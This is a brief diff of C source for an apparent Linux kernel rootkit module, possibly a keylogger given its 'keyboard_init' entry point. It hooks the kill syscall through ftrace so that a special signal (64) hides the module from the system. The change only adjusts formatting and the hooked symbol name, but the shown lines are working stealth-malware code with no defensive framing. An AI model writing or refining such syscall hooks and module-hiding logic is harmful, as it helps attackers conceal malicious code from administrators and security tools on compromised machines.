@@ -21,7 +21,7 @@ static asmlinkage long (*orig_kill)(const struct pt_regs *);
 
 asmlinkage int hook_kill(const struct pt_regs *regs){
 
-        int sig = (int) regs -> si;
+        int sig = (int)regs->si;
         if(sig == 64 && hid == 0){
                 printk(KERN_INFO "Hiding module!\n");
                 hid = 1;
@@ -41,7 +41,7 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 #endif
 
 static struct ftrace_hook hooks[] = {
-    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+    HOOK("sys_kill", hook_kill, &orig_kill),
 };
 
 static int __init keyboard_init(void) {
